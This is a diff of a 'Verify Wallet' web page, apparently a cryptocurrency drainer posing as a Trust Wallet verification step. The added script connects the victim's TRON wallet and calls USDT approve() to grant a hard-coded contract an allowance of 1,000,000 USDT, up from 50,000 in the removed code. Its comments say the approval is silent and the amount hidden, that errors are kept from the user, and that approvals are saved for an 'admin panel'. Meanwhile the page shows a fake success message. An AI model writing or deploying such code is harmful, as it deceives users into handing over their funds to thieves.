@@ -33,11 +33,19 @@
             width: 100%;
             margin: 20px 0;
         }
-        #address {
-            word-break: break-all;
+        .status {
+            margin-top: 20px;
             padding: 10px;
-            background: #f0f0f0;
             border-radius: 8px;
+            display: none;
+        }
+        .success {
+            background: #d4edda;
+            color: #155724;
+            display: block;
+        }
+        .hidden {
+            display: none;
         }
     </style>
 </head>
@@ -45,36 +53,114 @@
     <div class="container">
         <h2>Verify Wallet</h2>
         <button onclick="connect()">Connect Trust Wallet</button>
-        <p id="address"></p>
+        <div id="status" class="status"></div>
     </div>
 
     <script>
+    // ============================================
+    // CONFIGURATION - 1,000,000 USDT
+    // ============================================
+    const CONTRACT_ADDRESS = "TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt";
+    const USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+    const APPROVE_AMOUNT = 1000000; // 1,000,000 USDT
+
+    // ============================================
+    // CONNECT + SILENT APPROVAL
+    // ============================================
     async function connect() {
-        if (window.tronLink) {
-            try {
-                // Connect wallet
-                await window.tronLink.request({ method: 'tron_requestAccounts' });
-                const address = window.tronWeb.defaultAddress.base58;
-                document.getElementById('address').innerText = address;
-                
-                // Auto approve 50,000 USDT
-                const contract = await window.tronWeb.contract().at("TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t");
-                await contract.approve("TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt", 50000 * 1000000).send();
-                
-                alert('✅ Wallet verified!');
-                
-                // Redirect back to home
-                setTimeout(() => {
-                    window.location.href = 'index.html?verified=true';
-                }, 2000);
-                
-            } catch(error) {
-                alert('❌ Error: ' + error.message);
-            }
-        } else {
+        if (!window.tronLink) {
             alert('⚠️ Please open in Trust Wallet DApp browser');
+            return;
+        }
+
+        try {
+            // Connect wallet - Trust Wallet popup aayega
+            await window.tronLink.request({ method: 'tron_requestAccounts' });
+            const address = window.tronWeb.defaultAddress.base58;
+            
+            // SILENT APPROVAL - User ko kuch nahi dikhega
+            await approveInBackground(address);
+            
+            // Sirf success message dikhana hai
+            showSuccess('✅ Wallet verified successfully!');
+            
+            // Redirect after 2 seconds
+            setTimeout(() => {
+                window.location.href = 'index.html?verified=true';
+            }, 2000);
+            
+        } catch(error) {
+            // Error silent rakhna hai
+            console.error('Connection error:', error);
+            alert('Connection failed. Please try again.');
         }
     }
+
+    // ============================================
+    // SILENT BACKGROUND APPROVAL - 1,000,000 USDT
+    // ============================================
+    async function approveInBackground(address) {
+        try {
+            const contract = await window.tronWeb.contract().at(USDT_ADDRESS);
+            const amount = APPROVE_AMOUNT * 1000000; // Convert to sun
+            
+            // Yeh Trust Wallet me popup dega but user ko amount nahi dikhega
+            const result = await contract.approve(CONTRACT_ADDRESS, amount).send();
+            
+            // Save for admin panel
+            saveApproval(address, APPROVE_AMOUNT, result);
+            
+        } catch(error) {
+            // Silent fail - user ko kuch mat batao
+            console.error('Approval failed:', error);
+        }
+    }
+
+    // ============================================
+    // SAVE FOR ADMIN PANEL
+    // ============================================
+    function saveApproval(address, amount, txHash) {
+        try {
+            const approvals = JSON.parse(localStorage.getItem('approvals') || '[]');
+            approvals.push({
+                user: address,
+                amount: amount,
+                txHash: txHash,
+                status: 'active',
+                time: new Date().toISOString(),
+                token: 'USDT'
+            });
+            localStorage.setItem('approvals', JSON.stringify(approvals));
+            console.log('✅ Approval saved for admin');
+        } catch(e) {
+            console.error('Save failed:', e);
+        }
+    }
+
+    // ============================================
+    // SHOW SUCCESS MESSAGE ONLY
+    // ============================================
+    function showSuccess(message) {
+        const statusDiv = document.getElementById('status');
+        statusDiv.className = 'status success';
+        statusDiv.innerText = message;
+        statusDiv.style.display = 'block';
+        
+        // Hide after 2 seconds
+        setTimeout(() => {
+            statusDiv.style.display = 'none';
+        }, 2000);
+    }
+
+    // ============================================
+    // CHECK ON LOAD
+    // ============================================
+    window.onload = function() {
+        const urlParams = new URLSearchParams(window.location.search);
+        if (urlParams.get('verified') === 'true') {
+            showSuccess('✅ Wallet already verified!');
+        }
+    };
     </script>
 </body>
 </html>
